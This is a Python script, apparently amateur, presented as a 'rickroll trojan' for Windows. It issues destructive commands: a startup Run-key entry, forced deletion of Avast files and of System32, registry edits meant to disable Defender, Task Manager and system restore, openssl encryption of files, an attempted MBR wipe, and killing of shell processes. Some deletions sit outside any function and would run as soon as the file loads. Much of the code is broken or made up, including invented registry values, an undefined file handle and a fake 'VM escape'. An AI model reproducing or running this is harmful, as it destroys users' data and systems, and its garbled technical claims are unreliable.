import random
import webbrowser
import os
import sys
import time
import pyautogui
#warn user about consequences
def warn():
    print("Warning this is considered malware if you dont close this with in 31 seconds your pc is trash if you want to run it wait 30 seconds this virus can probably infect your host pc...")
    time.sleep(31)
    print("rickroll trojan engaged!!.")
#add startup record for trojan
def add_startup():
    print("Adding startup record for trojan...")
    os.system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v rickroll /t REG_SZ /d rickroll-trojan.exe")
    print("Adding startup record for trojan is done.")
# delete avast and avast free
def delete_avast():
    print("Deleting avast because its trash!!...")
time.sleep(5)  
os.system("del /f /s /q C:\\ProgramData\\Avast\\")
print("Deleting avast is done.")
# time.sleep(5)   
#if ran in vm escape vm and infect host pc
def vm_escape():
     print("infecting host pc...")
time.sleep(1)
os.system("vmware-cmd -k")
print("Escape from vm is done.")
#disable system restore
def disable_restore():
    print("Disabling system restore...")
    os.system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableSystemRestore /t REG_DWORD /d 1 /f")
    print("Disabling system restore is done.")
#disable windows defender
def disable_defender():
    print("Disabling windows defender...")
    os.system("reg add HKLM\\Software\\Microsoft\\Windows Defender /v DisableAntiSpyware /t REG_DWORD /d 1 /f")
    print("Disabling windows defender is done.")
    print("Disabling windows defender is going to disable...")
    #disable other antivirus
    print("Disabling other antivirus...")
    os.system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableCATATonic /t REG_DWORD /d 0 /f")
    print("Disabling other antivirus is done.")
#disable regedit
def disable_regedit():
    print("Disabling regedit...")
    os.system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f")
    print("Disabling regedit is done.")
    #disable task manager
    print("Disabling task manager...")
    os.system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableTaskMgr /t REG_DWORD /d 0 /f")
    print("Disabling task manager is done.")
    #disable installing apps
    print("Disabling installing apps...")
    os.system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableInstallerDetection /t REG_DWORD /d 0 /f")
    print("Disabling installing apps is done.")
    #disable control panel
    print("Disabling control panel...")
    os.system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableCPL /t REG_DWORD /d 0 /f")
    print("Disabling control panel is done.")
    #disbale apps that are not the virus
    print("Disabling apps that are not the virus...")
    os.system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableNonSysComponents /t REG_DWORD /d 0 /f")
    print("Disabling apps that are not the virus is done.")
    #delete shadow copies
    print("Deleting shadow copies...")
    os.system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableShadowCopy /t REG_DWORD /d 0 /f")
    print("Deleting shadow copies is done.")
    #purge shadow copies
    print("Purging shadow copies...")
    os.system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableShadowCopyPurge /t REG_DWORD /d 0 /f")
    print("Purging shadow copies is done.")
    #disable usb
    print("Disabling usb...")
    os.system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableUSBDrives /t REG_DWORD /d 0 /f")
    print("Disabling usb is done.")
    #enable usb keyboard
    print("Enabling usb keyboard...")
    os.system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableUSBKeyboard /t REG_DWORD /d 1 /f")
    print("Enabling usb keyboard is done.")
    #disable help
    print("Disabling help...")
    os.system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableHelp /t REG_DWORD /d 0 /f")
    print("Disabling help is done.")
    #add rickroll regestry key
    print("Adding rickroll regestry key...")
    os.system("reg add HKLM\\Software\\Microsoft\\Windows\\ /v nevergonnagiveyouup /t REG_DWORD /d 0 /f")
    print("Adding rickroll regestry key is done.")
    #disable microsoft account
    print("Disabling microsoft account...")
    os.system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableAccounts /t REG_DWORD /d 1 /f")
    print("Disabling microsoft account is done.")
#rickroll virus
def rickroll():
    print("Rickroll trojan is running...")
    time.sleep(5)
    webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
    print("Rickroll trojan done rickrolling.")
    time.sleep(3)
#encrypt function
def encrypt(files):
    print("rickroll trojan now Encrypting files...")
    time.sleep(5)
    for file in files:
        print("Encrypting file: " + file)
        time.sleep(3)
        os.system("openssl enc -aes-256-cbc -salt -in " + file + " -out " + file + ".enc")
        print("File " + file + " is encrypted.")
        time.sleep(4)
    print("Encrypting files is done.")
    time.sleep(5)
    print("Encrypting files is going to mbr...")
    time.sleep(5)
   #mbr overwrite function
def mbr_overwrite():
    print("Overwriting MBR...")
    time.sleep(5)
    f.open("\\\\.\\PhysicalDrive0")
    f.write(b"\x00" * 512)
    f.close()
    print("Overwriting MBR is done.")
    time.sleep(5)
    print("now going to end pc...")
    #final rickroll
    rickroll()
    time.sleep(3)
            #disable internet
    print("Disabling internet...")
    os.system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableRDP /t REG_DWORD /d 0 /f")
    print("Disabling internet is done.")
    # task kill explorer
    os.system("taskkill /f /im explorer.exe")
    # task kill cmd
    os.system("taskkill /f /im cmd.exe")
    # task kill powershell
    os.system("taskkill /f /im powershell.exe")
    #delete os
    print("Deleting os...")
    os.system("del /f /s /q C:\\Windows\\System32\\")
    print("Deleting os is done.")   
    #disable task manager
    print("Disabling task manager...")
    os.system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableTaskMgr /t REG_DWORD /d 0 /f")
    print("Disabling task manager is done.")
    os.system("reboot")
